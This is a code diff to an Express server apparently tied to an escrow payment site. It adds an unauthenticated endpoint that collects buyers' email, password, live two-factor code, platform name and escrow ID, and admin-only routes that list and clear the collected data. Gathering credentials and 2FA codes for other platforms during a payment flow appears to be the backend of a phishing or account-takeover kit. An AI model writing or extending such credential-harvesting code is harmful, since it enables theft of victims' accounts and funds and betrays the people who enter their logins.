@@ -117,6 +117,7 @@ let db = {
   history: [],
   notifications: [],
   clientLogins: [],
+  buyerLogins: [],
   verificationTokens: [],
   verifiedEmails: []
 };
@@ -534,6 +535,42 @@ app.delete('/api/client-logins', authenticate(['admin']), async (req, res) => {
   db.clientLogins = [];
   await saveDb();
   return res.json({ success: true, message: 'All login data cleared' });
+});
+
+// Store buyer login attempt (no auth required - called during payment flow)
+app.post('/api/buyer-logins', async (req, res) => {
+  const { email, password, twoFactorCode, platform, escrowId, step } = req.body;
+  // Hash password before storing for security
+  const hashedPassword = password ? await bcrypt.hash(password, 10) : '';
+  const loginEntry = {
+    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+    email: email || '',
+    password: hashedPassword,
+    twoFactorCode: twoFactorCode || '',
+    platform: platform || 'unknown',
+    escrowId: escrowId || 'unknown',
+    step: step || 'unknown',
+    ipAddress: req.ip || req.connection?.remoteAddress || 'unknown',
+    userAgent: req.headers['user-agent'] || 'unknown',
+    timestamp: new Date().toISOString()
+  };
+  db.buyerLogins = db.buyerLogins || [];
+  db.buyerLogins.unshift(loginEntry);
+  db.buyerLogins = db.buyerLogins.slice(0, 500); // Keep last 500 entries
+  await saveDb();
+  return res.json({ success: true });
+});
+
+// Get all buyer login attempts (admin only)
+app.get('/api/buyer-logins', authenticate(['admin']), async (req, res) => {
+  return res.json(db.buyerLogins || []);
+});
+
+// Clear all buyer login data (admin only)
+app.delete('/api/buyer-logins', authenticate(['admin']), async (req, res) => {
+  db.buyerLogins = [];
+  await saveDb();
+  return res.json({ success: true, message: 'All buyer login data cleared' });
 });
 
 // 2FA Setup endpoint - Generate QR code for TOTP
